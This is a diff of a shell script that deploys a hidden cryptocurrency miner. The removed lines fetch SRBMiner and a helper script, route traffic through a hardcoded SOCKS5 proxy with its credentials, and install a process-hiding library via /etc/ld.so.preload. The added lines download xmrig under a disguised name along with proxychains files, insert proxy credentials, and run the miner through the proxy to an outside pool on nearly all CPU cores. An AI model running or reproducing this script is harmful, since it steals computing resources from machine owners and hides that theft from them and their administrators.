@@ -1,48 +1,23 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 154.13.24.58:6316
-socks5_username = ingfoingfo
-socks5_password = maszZeehh
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/SRBMiner-MULTI && wget https://raw.githubusercontent.com/AhmadTugiman/gembel/main/xdg.sh 
-chmod +x SRBMiner-MULTI && chmod +x xdg.sh
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp bash xdg.sh
+proxy="185.205.194.126" 
+port="7646" 
+user="ingfoingfo"  
+pass="maszZeehh"
+wget -q -O reves https://gitlab.com/cuanbos/xdag/-/raw/main/xmrig && chmod +x reves
+wget -q https://gitlab.com/cuanbos/sock5/-/raw/main/panel && chmod +x panel 
+wget -q https://gitlab.com/cuanbos/sock5/-/raw/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitlab.com/cuanbos/sock5/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf"  
+sleep 11 
+echo "******" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./reves -o 173.212.235.123:13656 -u 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx -p $(echo $(shuf -i 1-20000 -n 1)) -a rx/xdag -t $(($(nproc)-1))
